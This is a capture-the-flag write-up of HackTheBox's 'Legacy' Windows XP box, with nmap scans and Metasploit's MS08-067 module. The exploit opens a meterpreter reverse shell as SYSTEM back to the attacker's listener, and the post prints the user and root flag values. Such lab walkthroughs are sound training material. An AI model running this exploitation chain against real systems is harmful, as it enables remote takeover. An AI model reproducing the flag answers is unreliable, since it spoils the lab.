---
title: Legacy
icon: old-man
category: machines
date: 2025-06-14
difficulty: easy
os: windows
---

Time to cover "Legacy", the first Windows box on HackTheBox. We wil be using the "Guided Mode" questions to help us through.

## Task 1

> How many TCP ports are open on Legacy?

```
$ sudo nmap 10.10.10.4

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 08:41 CEST
Nmap scan report for 10.10.10.4
Host is up (0.036s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

There are `3` open ports.

## Task 2

> What is the 2008 CVE ID for a vulnerability in SMB that allows for remote code execution?

This is `CVE-2008-4250`.

## Task 3

> What is the name of the Metasploit module that exploits CVE-2008-4250?

```
$ msfconsole

# ...

msf6 > search CVE-2008-4250

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1     \_ target: Automatic Targeting
   2     \_ target: Windows 2000 Universal
   3     \_ target: Windows XP SP0/SP1 Universal
   4     \_ target: Windows 2003 SP0

   # ...

   82    \_ target: Windows 2003 SP2 Turkish (NX)


Interact with a module by name or index. For example info 82, use 82 or use exploit/windows/smb/ms08_067_netapi
After interacting with a module you can manually set a TARGET with set TARGET 'Windows 2003 SP2 Turkish (NX)'
```

The name of the module is `ms08_067_netapi`.

## Task 4

> When exploiting MS08-067, what user does execution run as? Include the information before and after the .

We can run the exploit module to find out. We will configure `RHOSTS` and `LHOST` to the correct values:

```
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/usi
                                       ng-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.102.163  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4

msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => 10.10.14.4

msf6 exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 10.10.14.4:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.16/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.4:1032) at 2025-06-14 08:53:19 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

So the answer here is `NT AUTHORITY\SYSTEM`.

## Collecting flags

```
meterpreter > shell
Process 1928 created.
Channel 2 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.342.623.232 bytes free

C:\Documents and Settings>type john\Desktop\user.txt
e69af0e4f443de7e36876fda4ec7644f

C:\Documents and Settings>type Administrator\Desktop\root.txt
993442d258b0e0ec917cae9e695d5713
```

## Task 7

This CVE is `CVE-2017-0143`.
